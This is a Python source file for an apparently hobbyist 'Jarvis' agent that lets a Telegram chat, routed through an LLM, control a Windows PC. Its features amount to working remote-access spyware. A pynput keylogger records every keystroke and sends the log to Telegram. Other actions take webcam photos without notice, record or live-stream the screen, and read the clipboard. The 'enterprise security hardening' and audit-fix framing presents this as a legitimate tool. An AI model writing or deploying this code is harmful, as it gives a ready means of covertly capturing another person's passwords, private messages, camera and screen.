"""
Jarvis Omni-Agent: PC Controller (Windows) — Enterprise Edition v2
Async rewrite with full security hardening, RBAC, and asyncio concurrency.

Security Features:
- is_relative_to() path traversal fix (Audit #1)
- subprocess.run list-args for launch() (Audit #2)
- Fixed PowerShell invocation in app_history() (Audit #3)
- Startup validation for all required secrets (Audit #10)
- HTTP/HTTPS-only URL enforcement in download() (Audit #6)
- Shared asyncio.Lock for keylogger I/O (Audit #7)
- asyncio.Event for race-free live-stream control (Audit #11)
- asyncio.Lock for chat_history (Audit #12)
- No f-strings without interpolation (Audit #15)
- No stdlib imports inside try block (Audit #15)

Concurrency:
- Full asynScio + python-telegram-bot v20+ (no threading for actions)
- asyncio.Lock for all shared mutable state
- Keylogger pynput listener isolated in run_in_executor

RBAC:
- Privilege levels: SAFE, ELEVATED, DESTRUCTIVE
- Destructive actions require a time-limited confirmation token
"""

from __future__ import annotations

import asyncio
import hashlib
import json
import logging
import os
import re
import secrets
import shlex
import subprocess
import sys
import time
from dataclasses import dataclass, field
from enum import Enum, auto
from functools import wraps
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional, Tuple
from urllib.parse import urlparse

import numpy as np
import pyautogui
import pyperclip
import requests
import cv2
from dotenv import load_dotenv
from groq import Groq
from pynput import keyboard
from telegram import Update
from telegram.ext import (
    Application,
    ContextTypes,
    MessageHandler,
    filters,
)

# ── Load .env ──────────────────────────────────────────────────────────────────
load_dotenv()


# ── Config & validation ────────────────────────────────────────────────────────
def _require_env(key: str) -> str:
    """Return env var or raise at startup — no silent fallback secrets."""
    value = os.getenv(key, "").strip()
    if not value:
        raise ValueError(
            f"Required environment variable '{key}' is not set. "
            "Add it to your .env file and restart."
        )
    return value


TELEGRAM_TOKEN: str = _require_env("TELEGRAM_TOKEN")
CHAT_ID: str = _require_env("CHAT_ID")
GROQ_API_KEY: str = _require_env("GROQ_API_KEY")

ALLOWED_CMDS: List[str] = ["ipconfig", "dir", "whoami"]
ALLOWED_APPS: List[str] = ["chrome", "notepad", "calc"]

BASE_DIR: Path = Path.home() / ".jarvis" / "downloads"
BASE_DIR.mkdir(parents=True, exist_ok=True)

MAX_FILE_SIZE_BYTES: int = 500 * 1024 * 1024
MAX_OUTPUT_LENGTH: int = 4000
COMMAND_TIMEOUT: int = 30
MAX_HISTORY: int = 10
CONFIRM_TTL_SECONDS: int = 60


# ── Logging ────────────────────────────────────────────────────────────────────
def _setup_logger() -> logging.Logger:
    logger = logging.getLogger("JarvisPCv2")
    logger.setLevel(logging.INFO)
    fh = logging.FileHandler("jarvis_pc_audit.log")
    fh.setLevel(logging.INFO)
    ch = logging.StreamHandler()
    ch.setLevel(logging.WARNING)
    fmt = logging.Formatter(
        "%(asctime)s - %(name)s - %(levelname)s - [%(funcName)s] - %(message)s"
    )
    fh.setFormatter(fmt)
    ch.setFormatter(fmt)
    logger.addHandler(fh)
    logger.addHandler(ch)
    return logger


logger: logging.Logger = _setup_logger()


# ── RBAC ───────────────────────────────────────────────────────────────────────
class Privilege(Enum):
    SAFE = auto()         # Execute immediately (read-only or harmless)
    ELEVATED = auto()     # Execute if authenticated (default for most writes)
    DESTRUCTIVE = auto()  # Requires an explicit in-chat confirmation token


@dataclass
class PendingConfirmation:
    action: str
    param: str
    expires_at: float = field(default_factory=lambda: time.monotonic() + CONFIRM_TTL_SECONDS)

    def is_expired(self) -> bool:
        return time.monotonic() > self.expires_at


# Maps action name → privilege level
ACTION_PRIVILEGES: Dict[str, Privilege] = {
    "ss": Privilege.SAFE,
    "webcam": Privilege.SAFE,
    "clip_get": Privilege.SAFE,
    "app_history": Privilege.SAFE,
    "fetch_file": Privilege.ELEVATED,
    "clip_set": Privilege.ELEVATED,
    "cmd": Privilege.ELEVATED,
    "download": Privilege.ELEVATED,
    "record_screen": Privilege.ELEVATED,
    "live_screen": Privilege.ELEVATED,
    "fetch_keylog": Privilege.ELEVATED,
    "lock": Privilege.ELEVATED,
    "abort_shutdown": Privilege.ELEVATED,
    "launch": Privilege.ELEVATED,
    "start_keylogger": Privilege.DESTRUCTIVE,
    "stop_keylogger": Privilege.ELEVATED,
    "restart": Privilege.DESTRUCTIVE,
    "shutdown": Privilege.DESTRUCTIVE,
}


# ── Path safety ────────────────────────────────────────────────────────────────
def _safe_path(user_path: str) -> Optional[Path]:
    """
    Resolve path and verify it is strictly inside BASE_DIR.

    Uses Path.is_relative_to() (Python ≥ 3.9) to avoid the
    string-prefix bypass that afflicted the previous version.
    """
    try:
        target = Path(user_path).resolve()
        base = BASE_DIR.resolve()
        if not target.is_relative_to(base):
            logger.warning("Path traversal attempt: %s → %s", user_path, target)
            return None
        return target
    except (ValueError, RuntimeError) as exc:
        logger.error("Path validation error: %s", exc)
        return None


# ── File integrity ─────────────────────────────────────────────────────────────
def _sha256(file_path: Path, chunk_size: int = 8192) -> str:
    digest = hashlib.sha256()
    try:
        with open(file_path, "rb") as fh:
            for chunk in iter(lambda: fh.read(chunk_size), b""):
                digest.update(chunk)
        return digest.hexdigest()
    except OSError as exc:
        logger.error("Hash calculation error: %s", exc)
        return ""


# ── Retry decorator (async-native) ────────────────────────────────────────────
def retry_async(max_retries: int = 3, delay: float = 1.0) -> Callable:
    def decorator(func: Callable) -> Callable:
        @wraps(func)
        async def wrapper(*args: Any, **kwargs: Any) -> Any:
            last_exc: Optional[Exception] = None
            for attempt in range(max_retries):
                try:
                    return await func(*args, **kwargs)
                except (IOError, OSError, RuntimeError) as exc:
                    last_exc = exc
                    if attempt < max_retries - 1:
                        logger.warning(
                            "%s attempt %d failed — retrying in %.1fs",
                            func.__name__, attempt + 1, delay,
                        )
                        await asyncio.sleep(delay)
            if last_exc:
                raise last_exc
        return wrapper
    return decorator


# ── Main agent ─────────────────────────────────────────────────────────────────
class JarvisPCv2:
    """
    Async PC controller.  All Telegram handlers are coroutines;
    blocking I/O is delegated to asyncio.get_event_loop().run_in_executor().
    """

    def __init__(self) -> None:
        self.ai: Groq = Groq(api_key=GROQ_API_KEY)
        self.chat_id: str = CHAT_ID

        # ── Shared mutable state — each guarded by its own asyncio.Lock ──────
        self._history_lock: asyncio.Lock = asyncio.Lock()
        self._chat_history: List[Dict[str, str]] = []

        self._live_event: asyncio.Event = asyncio.Event()   # set = running
        self._live_task: Optional[asyncio.Task] = None

        self._keylog_lock: asyncio.Lock = asyncio.Lock()
        self._keylogger_active: bool = False
        self._keylog_file: Path = BASE_DIR / "keylog.txt"

        self._confirm_lock: asyncio.Lock = asyncio.Lock()
        self._pending: Dict[str, PendingConfirmation] = {}

        self.system_instruction: str = (
            "You are an advanced PC automation agent. "
            "Return ONLY a JSON object with keys: action, param. "
            "Allowed actions: ss, webcam, clip_get, chat, cmd, download, "
            "clip_set, launch, fetch_file, record_screen, live_screen, "
            "app_history, lock, restart, shutdown, abort_shutdown, "
            "start_keylogger, stop_keylogger, fetch_keylog. "
            "Use abort_shutdown to CANCEL a scheduled shutdown."
        )

        self.actions: Dict[str, Callable] = {
            "ss": self.ss,
            "webcam": self.webcam,
            "clip_get": self.clip_get,
            "clip_set": self.clip_set,
            "cmd": self.cmd,
            "download": self.download,
            "launch": self.launch,
            "fetch_file": self.fetch_file,
            "record_screen": self.record_screen,
            "live_screen": self.live_screen,
            "app_history": self.app_history,
            "lock": self.lock,
            "restart": self.restart,
            "shutdown": self.shutdown,
            "abort_shutdown": self.abort_shutdown,
            "start_keylogger": self.start_keylogger,
            "stop_keylogger": self.stop_keylogger,
            "fetch_keylog": self.fetch_keylog,
        }

        logger.info("JarvisPCv2 initialised")

    # ── RBAC helpers ──────────────────────────────────────────────────────────
    def _make_token(self) -> str:
        """Generate a 6-character URL-safe confirmation token."""
        return secrets.token_urlsafe(4)[:6].upper()

    async def _request_confirmation(
        self, bot, action: str, param: str
    ) -> None:
        """Issue a confirmation challenge for a DESTRUCTIVE action."""
        token = self._make_token()
        async with self._confirm_lock:
            # Expire any stale tokens first
            self._pending = {
                t: p for t, p in self._pending.items() if not p.is_expired()
            }
            self._pending[token] = PendingConfirmation(action=action, param=param)

        await bot.send_message(
            self.chat_id,
            f"⚠️ *Destructive action requested:* `{action}`\n"
            f"Reply with the following within {CONFIRM_TTL_SECONDS}s to confirm:\n\n"
            f"`confirm {token}`",
            parse_mode="Markdown",
        )
        logger.warning("Confirmation requested for action=%s token=%s", action, token)

    async def _try_redeem_confirmation(
        self, bot, token: str
    ) -> bool:
        """
        Check whether `token` is a valid, unexpired confirmation.
        If valid, execute the pending action and return True.
        """
        async with self._confirm_lock:
            pending = self._pending.get(token)
            if not pending:
                return False
            if pending.is_expired():
                del self._pending[token]
                await bot.send_message(self.chat_id, "⏱️ Confirmation token expired.")
                return True  # consumed
            del self._pending[token]

        action = pending.action
        param = pending.param
        handler = self.actions.get(action)
        if handler:
            await bot.send_message(self.chat_id, f"✅ Confirmed — executing `{action}`…")
            await handler(bot, param)
        return True

    # ── Action methods ────────────────────────────────────────────────────────

    async def ss(self, bot, _: str) -> None:
        """Take a screenshot and send it."""
        try:
            loop = asyncio.get_event_loop()
            ss_file = BASE_DIR / "screenshot.png"
            await loop.run_in_executor(
                None, lambda: pyautogui.screenshot(str(ss_file))
            )
            if ss_file.exists() and ss_file.stat().st_size > 0:
                with open(ss_file, "rb") as fh:
                    await bot.send_photo(self.chat_id, fh)
                ss_file.unlink(missing_ok=True)
                logger.info("Screenshot captured")
            else:
                await bot.send_message(self.chat_id, "❌ Screenshot capture failed.")
        except PermissionError:
            await bot.send_message(self.chat_id, "❌ Screenshot: permission denied.")
        except Exception as exc:
            await bot.send_message(self.chat_id, f"❌ Screenshot error: {type(exc).__name__}")
            logger.error("Screenshot error: %s", exc)

    async def webcam(self, bot, _: str) -> None:
        """Capture a webcam photo with auto-focus warm-up."""
        loop = asyncio.get_event_loop()

        def _capture() -> Optional[Path]:
            cap = cv2.VideoCapture(0)
            try:
                if not cap.isOpened():
                    return None
                time.sleep(2)
                for _ in range(5):
                    cap.read()
                ret, frame = cap.read()
                if not ret or frame is None:
                    return None
                cam_file = BASE_DIR / "webcam.jpg"
                cv2.imwrite(str(cam_file), frame)
                return cam_file
            finally:
                cap.release()

        try:
            cam_file = await loop.run_in_executor(None, _capture)
            if cam_file and cam_file.exists():
                with open(cam_file, "rb") as fh:
                    await bot.send_photo(self.chat_id, fh)
                cam_file.unlink(missing_ok=True)
                logger.info("Webcam photo captured")
            else:
                await bot.send_message(self.chat_id, "❌ Webcam not accessible or capture failed.")
        except Exception as exc:
            await bot.send_message(self.chat_id, f"❌ Webcam error: {type(exc).__name__}")
            logger.error("Webcam error: %s", exc)

    async def clip_get(self, bot, _: str) -> None:
        """Retrieve clipboard content."""
        try:
            content = await asyncio.get_event_loop().run_in_executor(
                None, pyperclip.paste
            )
            await bot.send_message(
                self.chat_id,
                (content or "(empty clipboard)")[:MAX_OUTPUT_LENGTH],
            )
            logger.info("Clipboard retrieved")
        except Exception as exc:
            await bot.send_message(self.chat_id, f"❌ Clipboard error: {type(exc).__name__}")
            logger.error("clip_get error: %s", exc)

    async def clip_set(self, bot, param: str) -> None:
        """Set clipboard content."""
        if not param or len(param) > 10_000:
            await bot.send_message(self.chat_id, "❌ Text invalid or too long (max 10 000 chars).")
            return
        try:
            await asyncio.get_event_loop().run_in_executor(
                None, pyperclip.copy, param
            )
            await bot.send_message(self.chat_id, "✅ Clipboard updated.")
            logger.info("Clipboard set")
        except Exception as exc:
            await bot.send_message(self.chat_id, f"❌ Clipboard set error: {type(exc).__name__}")
            logger.error("clip_set error: %s", exc)

    async def cmd(self, bot, param: str) -> None:
        """Execute a whitelisted shell command."""
        try:
            parts = shlex.split(param)
        except ValueError as exc:
            await bot.send_message(self.chat_id, "❌ Invalid command syntax.")
            logger.error("shlex error: %s", exc)
            return

        if not parts:
            await bot.send_message(self.chat_id, "❌ Empty command.")
            return

        cmd_name = parts[0]
        if cmd_name not in ALLOWED_CMDS:
            await bot.send_message(
                self.chat_id, f"❌ Command '{cmd_name}' is not whitelisted."
            )
            logger.warning("Blocked command: %s", cmd_name)
            return

        # Per-argument length guard
        if any(len(a) > 256 for a in parts):
            await bot.send_message(self.chat_id, "❌ Argument too long.")
            return

        def _run() -> subprocess.CompletedProcess:
            return subprocess.run(
                parts,
                capture_output=True,
                text=True,
                timeout=COMMAND_TIMEOUT,
                check=False,
            )

        try:
            result = await asyncio.get_event_loop().run_in_executor(None, _run)
            output = result.stdout if result.returncode == 0 else (
                f"⚠️ Exit {result.returncode}:\n{result.stderr}"
            )
            await bot.send_message(
                self.chat_id,
                (output or "✅ Command executed (no output).")[:MAX_OUTPUT_LENGTH],
            )
            logger.info("Command executed: %s", cmd_name)
        except subprocess.TimeoutExpired:
            await bot.send_message(self.chat_id, "⏱️ Command timed out.")
            logger.error("Command timeout: %s", param)
        except Exception as exc:
            await bot.send_message(self.chat_id, f"❌ Error: {type(exc).__name__}")
            logger.error("cmd error: %s", exc)

    async def download(self, bot, param: str) -> None:
        """Download a file from an HTTPS URL with size and integrity checks."""
        if "|" not in param:
            await bot.send_message(self.chat_id, "❌ Format: url|filename")
            return

        raw_url, raw_name = param.split("|", 1)
        url = raw_url.strip()
        filename = os.path.basename(raw_name.strip())

        # ── Audit fix #6: enforce HTTP/HTTPS only ──────────────────────────
        parsed = urlparse(url)
        if parsed.scheme not in ("http", "https"):
            await bot.send_message(self.chat_id, "❌ Only HTTP/HTTPS URLs are permitted.")
            return

        if not url or not filename:
            await bot.send_message(self.chat_id, "❌ Invalid URL or filename.")
            return

        forbidden_chars = set('\\/|:*?"<>')
        if any(c in forbidden_chars for c in filename):
            await bot.send_message(self.chat_id, "❌ Filename contains forbidden characters.")
            return

        filepath = BASE_DIR / filename
        await bot.send_message(self.chat_id, f"⬇️ Downloading {filename}…")

        def _fetch() -> Tuple[int, str]:
            total = 0
            resp = requests.get(url, stream=True, timeout=60, verify=True)
            resp.raise_for_status()
            with open(filepath, "wb") as fh:
                for chunk in resp.iter_content(8192):
                    if chunk:
                        fh.write(chunk)
                        total += len(chunk)
                        if total > MAX_FILE_SIZE_BYTES:
                            filepath.unlink(missing_ok=True)
                            raise ValueError(
                                f"File exceeds {MAX_FILE_SIZE_BYTES // (1024**2)} MB limit."
                            )
            return total, _sha256(filepath)

        try:
            total_bytes, file_hash = await asyncio.get_event_loop().run_in_executor(
                None, _fetch
            )
            await bot.send_message(
                self.chat_id,
                f"✅ Downloaded: {filename}\n"
                f"Size: {total_bytes / (1024 * 1024):.2f} MB\n"
                f"SHA-256: {file_hash}",
            )
            logger.info("Downloaded %s (%d bytes)", filename, total_bytes)
        except ValueError as exc:
            await bot.send_message(self.chat_id, f"❌ {exc}")
        except requests.Timeout:
            await bot.send_message(self.chat_id, "⏱️ Download timed out.")
        except requests.RequestException as exc:
            await bot.send_message(self.chat_id, f"❌ Download failed: {str(exc)[:80]}")
            logger.error("Download error: %s", exc)

    async def fetch_file(self, bot, param: str) -> None:
        """Send a file from BASE_DIR to Telegram."""
        filename = os.path.basename(param)
        filepath = _safe_path(str(BASE_DIR / filename))

        if not filepath:
            await bot.send_message(self.chat_id, "❌ Access denied.")
            return
        if not filepath.exists():
            await bot.send_message(self.chat_id, "❌ File not found.")
            return
        if filepath.stat().st_size > MAX_FILE_SIZE_BYTES:
            await bot.send_message(self.chat_id, "❌ File too large to send.")
            return

        try:
            with open(filepath, "rb") as fh:
                await bot.send_document(self.chat_id, fh)
            logger.info("File sent: %s", filename)
        except PermissionError:
            await bot.send_message(self.chat_id, "❌ Permission denied.")
        except Exception as exc:
            await bot.send_message(self.chat_id, f"❌ Error: {type(exc).__name__}")
            logger.error("fetch_file error: %s", exc)

    async def record_screen(self, bot, param: str) -> None:
        """Record the screen for a bounded number of seconds."""
        try:
            duration = max(1, min(120, int(param)))
        except (ValueError, TypeError):
            duration = 5

        await bot.send_message(self.chat_id, f"🎥 Recording for {duration}s…")

        def _record() -> Optional[Path]:
            screen_size = tuple(pyautogui.size())
            video_file = BASE_DIR / "recording.mp4"
            fourcc = cv2.VideoWriter_fourcc(*"mp4v")
            out = cv2.VideoWriter(str(video_file), fourcc, 5.0, screen_size)
            if not out.isOpened():
                return None
            end = time.time() + duration
            frames = 0
            try:
                while time.time() < end:
                    try:
                        img = pyautogui.screenshot()
                        frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
                        out.write(frame)
                        frames += 1
                    except Exception as exc:
                        logger.warning("Frame capture error: %s", exc)
            finally:
                out.release()
            return video_file if frames > 0 else None

        try:
            video_file = await asyncio.get_event_loop().run_in_executor(None, _record)
            if video_file and video_file.exists():
                with open(video_file, "rb") as fh:
                    await bot.send_video(self.chat_id, fh)
                video_file.unlink(missing_ok=True)
                logger.info("Screen recording sent (%ds)", duration)
            else:
                await bot.send_message(self.chat_id, "❌ Recording failed or no frames captured.")
        except Exception as exc:
            await bot.send_message(self.chat_id, f"❌ Recording error: {type(exc).__name__}")
            logger.error("record_screen error: %s", exc)

    async def live_screen(self, bot, param: str) -> None:
        """
        Start or stop live screen broadcast.

        The asyncio.Event _live_event is the single source of truth.
        Set   = broadcast is running.
        Clear = broadcast is stopped.
        This eliminates the check-then-act race in the previous version.
        """
        if param == "start":
            if self._live_event.is_set():
                await bot.send_message(self.chat_id, "⚠️ Already streaming.")
                return
            self._live_event.set()
            self._live_task = asyncio.create_task(self._broadcast_live(bot))
            await bot.send_message(self.chat_id, "📡 Live stream started.")
            logger.info("Live stream started")

        elif param == "stop":
            if not self._live_event.is_set():
                await bot.send_message(self.chat_id, "⚠️ Not currently streaming.")
                return
            self._live_event.clear()
            if self._live_task:
                self._live_task.cancel()
                self._live_task = None
            await bot.send_message(self.chat_id, "🛑 Live stream stopped.")
            logger.info("Live stream stopped")

        else:
            await bot.send_message(self.chat_id, "❌ Use 'start' or 'stop'.")

    async def _broadcast_live(self, bot) -> None:
        """Asyncio task — sends a screenshot every 5 s while event is set."""
        try:
            while self._live_event.is_set():
                try:
                    live_file = BASE_DIR / "live.png"
                    loop = asyncio.get_event_loop()
                    await loop.run_in_executor(
                        None, lambda: pyautogui.screenshot(str(live_file))
                    )
                    if live_file.exists():
                        with open(live_file, "rb") as fh:
                            await bot.send_photo(self.chat_id, fh)
                        live_file.unlink(missing_ok=True)
                except Exception as exc:
                    logger.warning("Live frame error: %s", exc)
                await asyncio.sleep(5)
        except asyncio.CancelledError:
            pass
        finally:
            self._live_event.clear()

    async def launch(self, bot, param: str) -> None:
        """
        Launch a whitelisted application.

        Uses subprocess with a list (not os.system + f-string)
        to eliminate command injection. (Audit fix #2)
        """
        app_name = param.strip().lower()
        if app_name not in ALLOWED_APPS:
            await bot.send_message(
                self.chat_id, f"❌ App '{app_name}' is not whitelisted."
            )
            logger.warning("Launch attempt for non-whitelisted app: %s", app_name)
            return

        try:
            await asyncio.get_event_loop().run_in_executor(
                None,
                lambda: subprocess.run(
                    ["cmd", "/c", "start", "", app_name],
                    check=False, timeout=10,
                ),
            )
            await bot.send_message(self.chat_id, f"🚀 Launched {app_name}.")
            logger.info("Launched: %s", app_name)
        except Exception as exc:
            await bot.send_message(self.chat_id, f"❌ Launch error: {type(exc).__name__}")
            logger.error("Launch error: %s", exc)

    async def app_history(self, bot, _: str) -> None:
        """
        List running applications via PowerShell.

        Invoked as a proper argument list (Audit fix #3).
        """
        def _run() -> str:
            result = subprocess.run(
                [
                    "powershell",
                    "-NoProfile",
                    "-Command",
                    (
                        "Get-Process | Where-Object {$_.MainWindowTitle} | "
                        "Select-Object ProcessName,MainWindowTitle | Format-List"
                    ),
                ],
                capture_output=True,
                text=True,
                timeout=10,
                shell=False,
            )
            return result.stdout if result.returncode == 0 else result.stderr

        try:
            output = await asyncio.get_event_loop().run_in_executor(None, _run)
            await bot.send_message(
                self.chat_id,
                (output or "No windowed apps found.")[:MAX_OUTPUT_LENGTH],
            )
            logger.info("App history retrieved")
        except subprocess.TimeoutExpired:
            await bot.send_message(self.chat_id, "⏱️ App history timed out.")
        except Exception as exc:
            await bot.send_message(self.chat_id, f"❌ Error: {type(exc).__name__}")
            logger.error("app_history error: %s", exc)

    async def lock(self, bot, _: str) -> None:
        """Lock the Windows session."""
        try:
            await asyncio.get_event_loop().run_in_executor(
                None,
                lambda: subprocess.run(["rundll32.exe", "user32.dll,LockWorkStation"], check=True),
            )
            await bot.send_message(self.chat_id, "🔒 PC locked.")
            logger.info("PC locked")
        except subprocess.CalledProcessError as exc:
            await bot.send_message(self.chat_id, f"❌ Lock failed: {exc}")
            logger.error("Lock error: %s", exc)

    async def restart(self, bot, _: str) -> None:
        """Restart the PC with a 30-second delay. (DESTRUCTIVE — requires confirmation)"""
        try:
            await asyncio.get_event_loop().run_in_executor(
                None,
                lambda: subprocess.run(["shutdown", "/r", "/t", "30"], check=True),
            )
            await bot.send_message(self.chat_id, "🔄 PC restarting in 30 seconds.")
            logger.info("PC restart initiated")
        except subprocess.CalledProcessError as exc:
            await bot.send_message(self.chat_id, f"❌ Restart failed: {exc}")
            logger.error("Restart error: %s", exc)

    async def shutdown(self, bot, _: str) -> None:
        """Shut down the PC with a 30-second delay. (DESTRUCTIVE — requires confirmation)"""
        try:
            await asyncio.get_event_loop().run_in_executor(
                None,
                lambda: subprocess.run(["shutdown", "/s", "/t", "30"], check=True),
            )
            await bot.send_message(self.chat_id, "⏹️ PC shutting down in 30 seconds.")
            logger.info("PC shutdown initiated")
        except subprocess.CalledProcessError as exc:
            await bot.send_message(self.chat_id, f"❌ Shutdown failed: {exc}")
            logger.error("Shutdown error: %s", exc)

    async def abort_shutdown(self, bot, _: str) -> None:
        """Cancel a pending shutdown or restart."""
        try:
            await asyncio.get_event_loop().run_in_executor(
                None,
                lambda: subprocess.run(["shutdown", "/a"], check=True),
            )
            await bot.send_message(self.chat_id, "✅ Shutdown aborted.")
            logger.info("Shutdown aborted")
        except subprocess.CalledProcessError as exc:
            await bot.send_message(self.chat_id, f"❌ Abort failed (no shutdown pending?): {exc}")
            logger.error("Abort shutdown error: %s", exc)

    # ── Keylogger ──────────────────────────────────────────────────────────────

    async def start_keylogger(self, bot, _: str) -> None:
        """Start the keylogger. (DESTRUCTIVE — requires confirmation)"""
        if self._keylogger_active:
            await bot.send_message(self.chat_id, "⚠️ Keylogger is already running.")
            return
        self._keylogger_active = True
        asyncio.create_task(self._run_keylogger())
        await bot.send_message(self.chat_id, "🔑 Keylogger started.")
        logger.info("Keylogger started")

    async def stop_keylogger(self, bot, _: str) -> None:
        """Stop the keylogger."""
        if not self._keylogger_active:
            await bot.send_message(self.chat_id, "⚠️ Keylogger is not running.")
            return
        self._keylogger_active = False
        await bot.send_message(self.chat_id, "🛑 Keylogger stopped.")
        logger.info("Keylogger stopped")

    async def fetch_keylog(self, bot, _: str) -> None:
        """
        Atomically read and clear the keylog file.

        _keylog_lock is the same lock used by the keylogger worker,
        preventing concurrent read+clear vs. write races. (Audit fix #7)
        """
        async with self._keylog_lock:
            if not self._keylog_file.exists() or self._keylog_file.stat().st_size == 0:
                await bot.send_message(self.chat_id, "📭 Keylog is empty or doesn't exist.")
                return
            data = self._keylog_file.read_bytes()
            self._keylog_file.write_text("", encoding="utf-8")

        # Send outside the lock — avoids holding it during network I/O
        await bot.send_document(
            self.chat_id,
            data,
            filename="keylog.txt",
            caption="Keylog data — cleared after send.",
        )
        logger.info("Keylog fetched and cleared")

    async def _run_keylogger(self) -> None:
        """
        Run pynput's synchronous Listener inside run_in_executor so it
        does not block the event loop.  File writes acquire _keylog_lock
        (threading.Lock here since we're in a thread, not a coroutine).
        """
        import threading
        write_lock = threading.Lock()
        loop = asyncio.get_event_loop()

        def _on_press(key) -> Optional[bool]:
            if not self._keylogger_active:
                return False  # Returning False stops the listener
            try:
                if key == keyboard.Key.space:
                    char = " "
                elif key == keyboard.Key.enter:
                    char = "\n"
                elif key == keyboard.Key.tab:
                    char = "\t"
                elif hasattr(key, "char") and key.char:
                    char = key.char
                else:
                    char = f"[{key}]"

                with write_lock:
                    # Use asyncio.run_coroutine_threadsafe to acquire the async lock
                    future = asyncio.run_coroutine_threadsafe(
                        self._keylog_write(char), loop
                    )
                    future.result(timeout=1)
            except Exception as exc:
                logger.warning("Keylog write error: %s", exc)

        def _listen():
            with keyboard.Listener(on_press=_on_press) as listener:
                listener.join()

        try:
            await loop.run_in_executor(None, _listen)
        except Exception as exc:
            logger.error("Keylogger executor error: %s", exc)
        finally:
            self._keylogger_active = False

    async def _keylog_write(self, char: str) -> None:
        """Write a single character to the keylog file under the async lock."""
        async with self._keylog_lock:
            with open(self._keylog_file, "a", encoding="utf-8") as fh:
                fh.write(char)

    # ── Telegram message handler ───────────────────────────────────────────────

    async def handle_message(
        self, update: Update, context: ContextTypes.DEFAULT_TYPE
    ) -> None:
        """Main entry point for all incoming Telegram messages."""
        message = update.message
        if not message or not message.text:
            return

        # Auth gate — only respond to the configured chat
        if str(message.chat.id) != self.chat_id:
            logger.debug("Unauthorized chat: %s", message.chat.id)
            return

        text = message.text.strip()
        bot = context.bot

        # ── Check for in-flight confirmation redemptions ──────────────────
        confirm_match = re.fullmatch(r"confirm\s+([A-Z0-9]{6})", text, re.IGNORECASE)
        if confirm_match:
            token = confirm_match.group(1).upper()
            redeemed = await self._try_redeem_confirmation(bot, token)
            if redeemed:
                return
            await bot.send_message(
                self.chat_id, "❓ Unknown or expired confirmation token."
            )
            return

        await bot.send_chat_action(message.chat.id, "typing")

        # ── Route through AI ──────────────────────────────────────────────
        async with self._history_lock:
            self._chat_history.append({"role": "user", "content": text})
            self._chat_history = self._chat_history[-MAX_HISTORY:]
            history_snapshot = list(self._chat_history)

        try:
            completion = await asyncio.get_event_loop().run_in_executor(
                None,
                lambda: self.ai.chat.completions.create(
                    messages=[
                        {"role": "system", "content": self.system_instruction}
                    ] + history_snapshot,
                    model="llama-3.1-8b-instant",
                    response_format={"type": "json_object"},
                    timeout=15,
                ),
            )
            data = json.loads(completion.choices[0].message.content)
        except json.JSONDecodeError:
            await bot.send_message(self.chat_id, "⚠️ AI returned malformed JSON.")
            logger.error("AI JSON decode error")
            return
        except Exception as exc:
            await bot.send_message(self.chat_id, f"⚠️ AI error: {type(exc).__name__}")
            logger.error("AI processing error: %s", exc)
            return

        action: str = data.get("action", "chat")
        param: str = str(data.get("param", ""))

        if action == "chat":
            await bot.reply_to(message, param) if hasattr(bot, "reply_to") \
                else await bot.send_message(self.chat_id, param)
            return

        if action not in self.actions:
            await bot.send_message(self.chat_id, "❌ Unknown action.")
            logger.error("Unmapped action: %s", action)
            return

        # ── RBAC gate ─────────────────────────────────────────────────────
        privilege = ACTION_PRIVILEGES.get(action, Privilege.ELEVATED)
        if privilege == Privilege.DESTRUCTIVE:
            await self._request_confirmation(bot, action, param)
            return

        await self.actions[action](bot, param)

    # ── Lifecycle ─────────────────────────────────────────────────────────────

    def run(self) -> None:
        """Build the Application and start polling."""
        app = Application.builder().token(TELEGRAM_TOKEN).build()
        app.add_handler(
            MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_message)
        )
        logger.info("🔥 JarvisPCv2 running (async)…")
        app.run_polling(drop_pending_updates=True)


# ── Entry point ────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    try:
        JarvisPCv2().run()
    except ValueError as exc:
        # Raised by _require_env on startup — print clearly and exit
        print(f"[STARTUP ERROR] {exc}", file=sys.stderr)
        sys.exit(1)
    except Exception as exc:
        logger.critical("Fatal error: %s", exc)
        sys.exit(1)
